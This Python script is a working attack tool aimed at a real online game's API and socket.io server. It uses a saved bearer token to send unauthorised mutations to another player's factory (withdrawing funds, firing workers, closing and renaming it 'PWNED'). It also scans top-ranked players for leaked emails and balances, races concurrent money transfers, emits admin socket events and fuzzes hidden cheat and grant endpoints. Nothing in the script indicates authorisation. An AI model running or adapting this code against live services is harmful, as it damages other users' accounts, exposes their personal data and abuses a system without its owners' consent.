#!/usr/bin/env python3
"""RE + advanced vuln probe: factory IDOR, socket.io, transfer race, top player leak."""
import json
import re
import threading
import time
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
OUT = ROOT / "output" / "reverse"
AUTH = Path("/root/diplomacia-auth.json")
BASE = "https://diplomacia.com.tr/api"
SOCKET_URL = "https://diplomacia.com.tr"
DELAY = 3.0

HEADERS_BASE = {
    "Accept": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Origin": "https://diplomacia.com.tr",
    "Referer": "https://diplomacia.com.tr/",
}


def load():
    a = json.loads(AUTH.read_text())
    return a["token"], a["player_id"]


def api(method, path, token, body=None, no_auth=False):
    headers = dict(HEADERS_BASE)
    if not no_auth:
        headers["Authorization"] = f"Bearer {token}"
    data = None
    if body is not None:
        headers["Content-Type"] = "application/json"
        data = json.dumps(body).encode()
    url = BASE + path
    req = urllib.request.Request(url, data=data, headers=headers, method=method)
    time.sleep(DELAY)
    try:
        with urllib.request.urlopen(req, timeout=30) as r:
            raw = r.read().decode()
            return {"status": r.status, "data": json.loads(raw) if raw.startswith("{") else raw[:500], "cf": False}
    except urllib.error.HTTPError as e:
        raw = e.read().decode()
        try:
            data = json.loads(raw)
        except Exception:
            data = raw[:400]
        return {"status": e.code, "data": data, "cf": "1010" in raw}


def extract_socket_events():
    js = Path("/tmp/diplomacia-index.js").read_text(errors="ignore")
    events = sorted(set(re.findall(r'\.on\(["\']([a-zA-Z0-9_]+)["\']', js)))
    events += sorted(set(re.findall(r'emit\(["\']([a-zA-Z0-9_]+)["\']', js)))
    return sorted(set(events))


def probe_factory_idor(token, my_id):
    results = []
    # Get competitor factory from known war player
    war = api("GET", "/wars", token)
    competitor = None
    if war["status"] == 200:
        for w in war["data"].get("wars", []):
            competitor = w.get("declared_by")
            if competitor and competitor != my_id:
                break
    if not competitor:
        results.append({"test": "factory_idor", "error": "no competitor id"})
        return results

    fac = api("GET", f"/factories/player/{competitor}", token)
    fid = None
    if fac["status"] == 200 and fac["data"].get("factories"):
        fid = fac["data"]["factories"][0]["id"]
        owner = fac["data"]["factories"][0].get("name")

    mutations = [
        ("join", "POST", "/factories/join", {"factory_id": fid}),
        ("work", "POST", "/factories/work", {}),
        ("withdraw", "POST", "/factories/withdraw", {"factory_id": fid, "amount": 99999}),
        ("withdraw_res", "POST", "/factories/withdraw-resources", {"factory_id": fid, "resource": "altin", "amount": 9999}),
        ("fire_self", "POST", "/factories/fire", {"factory_id": fid, "target_player_id": competitor}),
        ("fire_me", "POST", "/factories/fire", {"factory_id": fid, "target_player_id": my_id}),
        ("salary", "POST", "/factories/salary", {"factory_id": fid, "salary_rate": 100}),
        ("close", "POST", "/factories/close", {"factory_id": fid}),
        ("reset_labor", "POST", "/factories/reset-labor", {"factory_id": fid, "target_player_id": competitor}),
        ("level_up", "POST", "/factories/level-up", {"factory_id": fid}),
        ("rename", "POST", "/factories/rename", {"factory_id": fid, "name": "PWNED"}),
    ]
    for name, method, path, body in mutations:
        if not fid:
            break
        r = api(method, path, token, body)
        exploited = r["status"] in (200, 201) and "error" not in str(r["data"]).lower()[:100]
        results.append({
            "test": f"factory_{name}",
            "factory_id": fid,
            "owner_player": competitor,
            "status": r["status"],
            "exploited": exploited,
            "response": str(r["data"])[:300],
        })
    return results


def probe_top_player_leak(token):
    results = []
    lb = api("GET", "/countries/leaderboard/world?page=1&limit=10", token)
    players = lb["data"].get("players", []) if lb["status"] == 200 else []
    sensitive_keys = {"email", "balance", "diamonds", "health_pills", "resources", "password"}

    for p in players[:10]:
        pid = p["id"]
        entry = {"username": p.get("username"), "rank": p.get("rank"), "leaks": {}}
        for ep in [f"/players/{pid}", f"/players/{pid}/donation-history", f"/players/{pid}/xp-history",
                   f"/military/player/{pid}", f"/factories/player/{pid}", f"/press/player/{pid}"]:
            r = api("GET", ep, token)
            entry[ep] = {"status": r["status"]}
            if r["status"] == 200:
                blob = json.dumps(r["data"]) if isinstance(r["data"], dict) else str(r["data"])
                found = [k for k in sensitive_keys if f'"{k}"' in blob]
                if found:
                    entry["leaks"][ep] = found
                if ep.endswith(f"/players/{pid}") and isinstance(r["data"], dict):
                    pl = r["data"].get("player", r["data"])
                    entry["profile_fields"] = list(pl.keys())[:40]
                    if pl.get("email"):
                        entry["EMAIL_LEAK"] = True
                    if pl.get("balance") is not None:
                        entry["BALANCE_LEAK"] = pl.get("balance")
        results.append(entry)
    return results


def probe_transfer_race(token, my_id):
    before = api("GET", "/players/profile", token)
    bal_before = before["data"].get("player", {}).get("balance", 0)
    # Need a second recipient - use fake, race same transfer
    fake = "00000000-0000-0000-0000-000000000099"
    outcomes = []
    barrier = threading.Barrier(8)

    def send_once(i):
        try:
            barrier.wait(timeout=5)
            headers = dict(HEADERS_BASE)
            headers["Authorization"] = f"Bearer {token}"
            headers["Content-Type"] = "application/json"
            body = json.dumps({"recipient_id": fake, "amount": 100}).encode()
            req = urllib.request.Request(BASE + "/transfer/send", data=body, headers=headers, method="POST")
            with urllib.request.urlopen(req, timeout=20) as r:
                outcomes.append({"thread": i, "status": r.status, "body": r.read().decode()[:150]})
        except urllib.error.HTTPError as e:
            outcomes.append({"thread": i, "status": e.code, "body": e.read().decode()[:150]})
        except Exception as ex:
            outcomes.append({"thread": i, "error": str(ex)})

    threads = [threading.Thread(target=send_once, args=(i,)) for i in range(8)]
    for t in threads:
        t.start()
    for t in threads:
        t.join()
    time.sleep(DELAY)
    after = api("GET", "/players/profile", token)
    bal_after = after["data"].get("player", {}).get("balance", 0)
    return {
        "balance_before": bal_before,
        "balance_after": bal_after,
        "delta": bal_after - bal_before,
        "outcomes": outcomes,
        "race_exploit": bal_before - bal_after > 100,  # money lost without successful transfer
    }


def probe_socket_io(token):
    import socketio

    events_log = []
    result = {"connected": False, "events": [], "errors": []}

    sio = socketio.Client(logger=False, engineio_logger=False)

    @sio.event
    def connect():
        result["connected"] = True
        events_log.append({"type": "connect"})

    @sio.event
    def connect_error(data):
        result["errors"].append(str(data))

    @sio.on("global_message")
    def on_global(data):
        events_log.append({"event": "global_message", "data": str(data)[:500]})

    @sio.on("dm_message")
    def on_dm(data):
        events_log.append({"event": "dm_message", "data": str(data)[:500]})

    @sio.on("country_announcement")
    def on_country(data):
        events_log.append({"event": "country_announcement", "data": str(data)[:500]})

    @sio.on("chat_error")
    def on_err(data):
        events_log.append({"event": "chat_error", "data": str(data)[:200]})

    for ev in ["global_history", "conf_message", "chat_ban", "chat_delete"]:
        sio.on(ev)(lambda d, e=ev: events_log.append({"event": e, "data": str(d)[:300]}))

    try:
        sio.connect(
            SOCKET_URL,
            auth={"token": token, "lang": "tr"},
            transports=["polling", "websocket"],
            wait_timeout=15,
        )
        time.sleep(2)
        # Probe emits from RE
        probes = [
            ("global_message", {"message": "audit-probe", "lang": "tr"}),
            ("join_global", {}),
            ("subscribe", {"channel": "admin"}),
            ("admin_broadcast", {"message": "test"}),
        ]
        for ev, payload in probes:
            try:
                sio.emit(ev, payload)
                events_log.append({"emit": ev, "payload": payload})
            except Exception as ex:
                events_log.append({"emit_error": ev, "error": str(ex)})
        time.sleep(3)
        sio.disconnect()
    except Exception as ex:
        result["errors"].append(str(ex))

    result["events"] = events_log
    result["bundle_events"] = extract_socket_events()
    return result


def probe_api_patterns(token):
    """Fuzz common hidden endpoints from RE."""
    patterns = [
        "/admin/users", "/admin/stats", "/debug", "/internal/health",
        "/api/v2/players/profile", "/players/me", "/economy/grant",
        "/cheat/gold", "/test", "/swagger", "/graphql",
        "/players/balance/add", "/mod/grant-gold",
    ]
    results = []
    for p in patterns:
        r = api("GET", p, token)
        if r["status"] not in (404, 401):
            results.append({"path": p, "status": r["status"], "data": str(r["data"])[:200]})
        r2 = api("POST", p, token, {})
        if r2["status"] not in (404, 401, 405):
            results.append({"path": p, "method": "POST", "status": r2["status"], "data": str(r2["data"])[:200]})
    return results


def main():
    OUT.mkdir(parents=True, exist_ok=True)
    token, my_id = load()
    report = {"run_at": datetime.utcnow().isoformat() + "Z", "sections": {}}

    print("=== 1. Factory IDOR mutations ===")
    report["sections"]["factory_idor"] = probe_factory_idor(token, my_id)
    for x in report["sections"]["factory_idor"]:
        flag = "!!!" if x.get("exploited") else "·"
        print(f"  {flag} {x.get('test')} -> {x.get('status')}")

    print("\n=== 2. Top player leak scan ===")
    report["sections"]["top_player_leak"] = probe_top_player_leak(token)
    leaks = [x for x in report["sections"]["top_player_leak"] if x.get("leaks") or x.get("EMAIL_LEAK")]
    print(f"  Players scanned: {len(report['sections']['top_player_leak'])}, leaks: {len(leaks)}")

    print("\n=== 3. Transfer race ===")
    report["sections"]["transfer_race"] = probe_transfer_race(token, my_id)
    print(f"  Delta: {report['sections']['transfer_race'].get('delta')}")

    print("\n=== 4. Socket.IO ===")
    try:
        report["sections"]["socket_io"] = probe_socket_io(token)
        print(f"  Connected: {report['sections']['socket_io'].get('connected')}, events: {len(report['sections']['socket_io'].get('events', []))}")
    except Exception as ex:
        report["sections"]["socket_io"] = {"error": str(ex)}

    print("\n=== 5. Hidden endpoint fuzz ===")
    report["sections"]["hidden_endpoints"] = probe_api_patterns(token)
    print(f"  Non-404 hits: {len(report['sections']['hidden_endpoints'])}")

    exploited = [x for x in report["sections"].get("factory_idor", []) if x.get("exploited")]
    report["summary"] = {
        "factory_exploits": len(exploited),
        "top_player_leaks": len(leaks),
        "transfer_race_delta": report["sections"]["transfer_race"].get("delta"),
        "socket_connected": report["sections"].get("socket_io", {}).get("connected"),
    }
    (OUT / "reverse_probe.json").write_text(json.dumps(report, ensure_ascii=False, indent=2), encoding="utf-8")
    print("\n=== DONE ===", report["summary"])
    return report


if __name__ == "__main__":
    main()
